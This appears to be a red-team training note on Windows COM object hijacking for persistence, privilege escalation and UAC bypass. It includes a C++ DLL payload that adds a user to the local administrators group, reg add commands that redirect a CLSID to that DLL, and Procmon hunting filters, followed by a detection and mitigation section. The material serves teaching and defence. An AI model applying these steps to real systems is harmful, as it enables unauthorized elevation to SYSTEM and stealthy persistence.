---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.29 COM Object Hijacking"
---

# 29 - COM Object Hijacking

## Executive Summary

Component Object Model (COM) Object Hijacking is a highly sophisticated, stealthy persistence and local privilege escalation technique. It meticulously exploits the inherent, hierarchical manner in which the Windows operating system locates and loads COM objects. By manipulating specific registry keys within the `HKEY_CURRENT_USER` (HKCU) hive—actions which critically do not require administrative privileges—an attacker can redirect the execution flow of a legitimate, higher-privileged application or scheduled task. The target application is tricked into loading a malicious Dynamic Link Library (DLL) entirely under the attacker's control, instead of the intended, legitimate COM component.

## Theoretical Foundation

**Component Object Model (COM):**
COM is a fundamental, language-neutral standard defined by Microsoft that enables diverse software components to communicate, interact, and instantiate objects dynamically. Developers utilize COM to construct reusable software modules (frequently implemented as DLLs or EXEs) that can be linked and invoked dynamically by other applications across the OS.

**COM Registration and Loading Order:**
When an application attempts to instantiate or utilize a COM object, it requests it using a globally unique identifier known as a Class ID (CLSID). The Windows configuration manager (Registry) maps this CLSID to the physical path of the corresponding DLL.

The critical vulnerability lies in the OS search order. When a process requests a CLSID, Windows queries the registry in the following priority order:
1. `HKEY_CURRENT_USER\Software\Classes\CLSID\{CLSID_Here}` (User-specific hive - intrinsically writable by the standard, unprivileged user)
2. `HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{CLSID_Here}` (System-wide hive - strictly requires Administrator privileges to modify)

**The Hijacking Mechanism:**
The overwhelming majority of system-level COM objects are registered exclusively within `HKEY_LOCAL_MACHINE` (HKLM). 
If an attacker manually crafts the corresponding CLSID registry structure under `HKEY_CURRENT_USER` (HKCU) and configures the `InprocServer32` default value to point to their custom malicious DLL, the OS will locate the HKCU entry *first*. Consequently, when a highly privileged process or an automated scheduled task attempts to instantiate that specific COM object, it will unwittingly load and execute the attacker's malicious DLL, immediately yielding privileged code execution.

## Architecture and ASCII Diagram

```text
+--------------------------------------------------------------------+
|                   COM Object Hijacking Flow                        |
|                                                                    |
|  +--------------------------+                                      |
|  | Target Process           |                                      |
|  | (NT AUTHORITY\SYSTEM)    |                                      |
|  +------------+-------------+                                      |
|               |                                                    |
|               | (1) Requests CLSID: {A1B2...}                      |
|               v                                                    |
|  +--------------------------+     (2) Check HKCU FIRST             |
|  | Windows COM Subsystem    | -------------------------+           |
|  +--------------------------+                          |           |
|                                                        v           |
|                                     +--------------------------+   |
|                                     | HKCU\...\CLSID\{A1B2...} |   |
|                                     | InprocServer32           |   |
|                                     | (Attacker Controlled)    |   |
|                                     +------------+-------------+   |
|                                                  |                 |
|      (3) Load Malicious DLL instead of           |                 |
|          the legitimate HKLM module              |                 |
|                                                  v                 |
|                                     +--------------------------+   |
|                                     | C:\Temp\evil.dll         |   |
|                                     | executes as SYSTEM!      |   |
|                                     +--------------------------+   |
+--------------------------------------------------------------------+
```

## Prerequisites and Environment Setup

To execute a successful COM Hijack, the attacker must satisfy the following conditions:

1. **Initial Access:** Standard user access to the target Windows system. No administrative privileges are required.
2. **Reconnaissance & Target Identification:** The ability to monitor system behavior and identify a COM object (CLSID) that is actively loaded by a higher-privileged process (for immediate privilege escalation) or by a frequently run user process (for stealthy persistence).
3. **Registry Write Access:** Standard users natively possess write access to their own `HKCU\Software\Classes\CLSID` registry hive.
4. **Payload Deployment:** A compiled, custom malicious DLL configured to export the necessary COM functions and execute the attacker's payload upon loading.

The absolute most critical tool for discovering vulnerable COM loading events is **Process Monitor (Procmon)** from the Sysinternals suite.

## Detailed Exploitation Walkthrough

### Scenario: Hijacking a Privileged Scheduled Task

Many built-in Windows Scheduled Tasks trigger COM objects directly rather than executing standard `.exe` binaries. If a task executes under the context of SYSTEM and attempts to load a COM object that is missing from HKCU, it represents a pristine target.

**Step 1: Vulnerability Discovery via Process Monitor**

1. Execute `Procmon.exe` on a test system that perfectly mirrors the target environment.
2. Configure stringent filters:
   - `Operation` is `RegOpenKey`
   - `Result` is `NAME NOT FOUND`
   - `Path` contains `HKCU\Software\Classes\CLSID`
3. Force scheduled tasks to execute manually or monitor natural system events.
4. Analyze the output for processes executing as `NT AUTHORITY\SYSTEM` (e.g., `svchost.exe` or `taskeng.exe`) searching for a CLSID in HKCU and failing to locate it.

*Assume for this scenario we discover `svchost.exe` attempting to load CLSID `{00000000-0000-0000-0000-000000000000}` from HKCU and failing.*

**Step 2: Crafting the Malicious DLL**

The attacker constructs a C++ DLL that exports the fundamental functions required by the COM subsystem (typically `DllMain`, `DllGetClassObject`, `DllCanUnloadNow`). The actual malicious payload is executed when `DllMain` is invoked upon the DLL being loaded into memory.

```cpp
// evil.cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Malicious Payload: Add standard user to local administrators group
        system("cmd.exe /c net localgroup administrators standard_user /add");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
Compile this source to a DLL, for instance, `C:\temp\evil.dll`.

**Step 3: Executing the Registry Hijack**

Utilizing standard command-line tools, PowerShell, or custom scripts, the attacker creates the specific registry architecture within the HKCU hive.

```cmd
# Create the CLSID key and point the default value to the malicious DLL
reg add "HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32" /ve /t REG_SZ /d "C:\temp\evil.dll" /f

# Ensure the ThreadingModel is explicitly set (often technically required for the COM subsystem to successfully load the DLL)
reg add "HKCU\Software\Classes\CLSID\{00000000-0000-0000-0000-000000000000}\InprocServer32" /v ThreadingModel /t REG_SZ /d Apartment /f
```

**Step 4: Triggering the Execution**

The attacker waits for the scheduled task to execute naturally. When it does, the privileged `svchost.exe` process will query HKCU, locate the attacker's registry entry, load `evil.dll`, and execute the `system()` call within `DllMain` with absolute SYSTEM privileges.

## Advanced Techniques & Bypasses

1. **UAC (User Account Control) Bypassing:** COM Hijacking is arguably the most famous and reliable methodology for bypassing UAC. Certain auto-elevating Windows binaries (such as `eventvwr.exe` or `sdclt.exe`) inherently load specific COM objects. By hijacking these particular CLSIDs within HKCU, a medium-integrity attacker process can coerce an auto-elevating high-integrity process into loading a malicious DLL, silently and instantly escalating privileges without triggering a UAC prompt to the user.
2. **TreatAs Subkey Hijacking:** Instead of directly replacing the `InprocServer32` key, an advanced attacker can utilize the `TreatAs` subkey. This subkey instructs the COM subsystem to treat the originally requested CLSID as an entirely different CLSID (which the attacker controls and registers). This method is significantly stealthier and evades basic behavioral detections looking for modified `InprocServer32` keys.

## Indicators of Compromise (IoCs) & Detection Engineering

### Log Sources and Telemetry

1. **Windows Security Event Logs:**
   - Standard Windows logging struggles to detect COM hijacking robustly without generating massive noise. However, monitoring `Event ID 4688` (Process Creation) for anomalous child processes (like `cmd.exe`) spawning from system processes (like `svchost.exe` or `mmc.exe`) is vital.
2. **Sysmon (System Monitor):**
   - `Event ID 12, 13, 14` (Registry Events): This is the primary detection mechanism. Configure Sysmon to aggressively alert on any creation or modification of keys under `*\Software\Classes\CLSID\*` by standard user processes.
   - `Event ID 7` (Image Loaded): Monitor for unsigned DLLs or DLLs located in temporary directories (`C:\temp`, `%APPDATA%`) being dynamically loaded by core system executables.

### Mitigation Strategies

1. **Endpoint Detection and Response (EDR):** Deploy sophisticated EDR solutions capable of deep behavioral analysis, specifically focusing on registry modifications within HKCU that attempt to override system-level COM objects.
2. **Application Control (AppLocker / WDAC):** Implement rigorous Application Control policies that explicitly prevent the execution or loading of unsigned DLLs or DLLs originating from non-system directories, entirely neutralizing the attacker's payload delivery mechanism.

## Chaining Opportunities

- **Initial Access Payload & Persistence:** COM Hijacking is extraordinarily common in malicious droppers, phishing payloads, or macro-enabled documents. It allows the malware to achieve immediate, stealthy persistence without ever requesting administrative rights from the user.
- **Lateral Movement Preparation:** It is frequently utilized to silently elevate privileges on a compromised workstation, allowing the attacker to subsequently dump credentials or disable local security controls before attempting to pivot to other network segments.

## Related Notes
- [[26 - Insecure File Folder Permissions]]
- [[28 - Named Pipe Impersonation]]
